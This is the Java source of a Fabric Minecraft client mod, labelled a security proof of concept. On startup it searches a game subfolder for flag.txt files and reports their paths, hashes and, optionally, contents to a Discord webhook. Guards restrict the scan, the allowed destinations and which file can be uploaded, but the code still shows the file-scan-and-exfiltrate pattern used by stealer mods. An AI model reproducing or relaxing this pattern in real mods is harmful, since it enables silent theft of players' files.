package dev.silentclutcher.minecraftmodpoc;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.loader.api.FabricLoader;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HexFormat;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.CompletableFuture;

public final class SecurityPocMod implements ClientModInitializer {
    private static final String MOD_TAG = "[MinecraftModPoC]";
    private static final long MAX_UPLOAD_BYTES = 7L * 1024L * 1024L;
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .build();

    @Override
    public void onInitializeClient() {
        Path gameDir = FabricLoader.getInstance().getGameDir().toAbsolutePath().normalize();
        Path configFile = FabricLoader.getInstance().getConfigDir().resolve("mcsecuritypoc.properties");
        try {
            Properties config = loadConfig(configFile);
            String webhook = config.getProperty("webhookUrl", "").trim();
            boolean sendContents = Boolean.parseBoolean(config.getProperty("sendContents", "false"));
            String configuredRoot = config.getProperty("scanRoot", "security-poc").trim();

            if (webhook.isEmpty()) {
                System.out.println(MOD_TAG + " Add webhookUrl to " + configFile + " to enable reporting.");
                return;
            }
            if (!webhook.startsWith("https://discord.com/api/webhooks/")
                    && !webhook.startsWith("https://discordapp.com/api/webhooks/")) {
                System.err.println(MOD_TAG + " Refusing to send: webhookUrl is not a Discord webhook URL.");
                return;
            }

            Path scanRoot = gameDir.resolve(configuredRoot).normalize();
            if (!scanRoot.startsWith(gameDir)) {
                System.err.println(MOD_TAG + " Refusing to scan outside the Minecraft game directory.");
                return;
            }
            if (!Files.isDirectory(scanRoot, LinkOption.NOFOLLOW_LINKS)) {
                System.out.println(MOD_TAG + " Scan directory does not exist: " + scanRoot);
                return;
            }

            System.out.println(MOD_TAG + " Scanning only: " + scanRoot);
            CompletableFuture.runAsync(() -> scanAndReport(gameDir, scanRoot, webhook, sendContents));
        } catch (Exception e) {
            System.err.println(MOD_TAG + " Could not initialize security scan: " + e.getMessage());
        }
    }

    private static Properties loadConfig(Path file) throws IOException {
        Properties p = new Properties();
        if (Files.exists(file)) {
            try (var in = Files.newInputStream(file)) {
                p.load(in);
            }
        } else {
            Files.createDirectories(file.getParent());
            p.setProperty("webhookUrl", "");
            p.setProperty("sendContents", "false");
            p.setProperty("scanRoot", "security-poc");
            try (var out = Files.newOutputStream(file)) {
                p.store(out, "Minecraft Mod Security PoC configuration");
            }
            Path fixtureDir = file.getParent().getParent()
                    .resolve("security-poc").resolve("approved-test-files");
            Files.createDirectories(fixtureDir);
            System.out.println(MOD_TAG + " Created config and test directory: " + fixtureDir);
        }
        return p;
    }

    private static void scanAndReport(Path gameDir, Path scanRoot, String webhook, boolean sendContents) {
        try {
            List<Path> matches = new ArrayList<>();
            try (var stream = Files.walk(scanRoot, Integer.MAX_VALUE, new FileVisitOption[0])) {
                stream.filter(p -> p.getFileName() != null)
                        .filter(p -> p.getFileName().toString().equalsIgnoreCase("flag.txt"))
                        .filter(p -> Files.isRegularFile(p, LinkOption.NOFOLLOW_LINKS))
                        .forEach(matches::add);
            }

            if (matches.isEmpty()) {
                postJson(webhook, "Minecraft Mod Security PoC: no flag.txt files found under "
                        + scanRoot + ".");
                System.out.println(MOD_TAG + " No flag.txt files found.");
                return;
            }

            Path approvedFixture = gameDir.resolve("security-poc")
                    .resolve("approved-test-files").resolve("flag.txt").normalize();

            for (Path file : matches) {
                Path real = file.toAbsolutePath().normalize();
                byte[] bytes = Files.readAllBytes(real);
                String sha256 = sha256(bytes);
                String report = "Minecraft Mod Security PoC\n"
                        + "File: " + real + "\n"
                        + "Size: " + bytes.length + " bytes\n"
                        + "SHA-256: " + sha256 + "\n"
                        + "Content upload enabled: " + sendContents;

                if (sendContents && real.equals(approvedFixture)) {
                    if (bytes.length > MAX_UPLOAD_BYTES) {
                        report += "\nContent upload skipped: test fixture exceeds 7 MiB.";
                        postJson(webhook, report);
                    } else {
                        postFile(webhook, report, bytes, "flag.txt");
                    }
                } else {
                    if (sendContents) {
                        report += "\nContent upload skipped: only "
                                + approvedFixture + " is eligible for the test-fixture upload.";
                    }
                    postJson(webhook, report);
                }
                System.out.println(MOD_TAG + " Reported " + real + " (SHA-256 " + sha256 + ")");
            }
        } catch (Exception e) {
            System.err.println(MOD_TAG + " Scan/report failed: " + e.getMessage());
        }
    }

    private static String sha256(byte[] bytes) throws Exception {
        return HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(bytes));
    }

    private static void postJson(String webhook, String message) throws Exception {
        String body = "{\"content\":\"" + jsonEscape(message) + "\"}";
        HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                .timeout(Duration.ofSeconds(20))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
                .build();
        checkResponse(HTTP.send(request, HttpResponse.BodyHandlers.ofString()));
    }

    private static void postFile(String webhook, String message, byte[] fileBytes, String filename)
            throws Exception {
        String boundary = "----MinecraftModPoCSecurityBoundary";
        ByteArrayOutputStream body = new ByteArrayOutputStream();
        write(body, "--" + boundary + "\r\n"
                + "Content-Disposition: form-data; name=\"payload_json\"\r\n"
                + "Content-Type: application/json; charset=utf-8\r\n\r\n"
                + "{\"content\":\"" + jsonEscape(message) + "\"}\r\n");
        write(body, "--" + boundary + "\r\n"
                + "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n"
                + "Content-Type: text/plain; charset=utf-8\r\n\r\n");
        body.write(fileBytes);
        write(body, "\r\n--" + boundary + "--\r\n");

        HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                .timeout(Duration.ofSeconds(30))
                .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                .POST(HttpRequest.BodyPublishers.ofByteArray(body.toByteArray()))
                .build();
        checkResponse(HTTP.send(request, HttpResponse.BodyHandlers.ofString()));
    }

    private static void write(ByteArrayOutputStream out, String text) throws IOException {
        out.write(text.getBytes(StandardCharsets.UTF_8));
    }

    private static String jsonEscape(String value) {
        return value.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n")
                .replace("\t", "\\t");
    }

    private static void checkResponse(HttpResponse<String> response) throws IOException {
        if (response.statusCode() < 200 || response.statusCode() >= 300) {
            throw new IOException("Discord webhook returned HTTP " + response.statusCode()
                    + ": " + response.body());
        }
    }
}
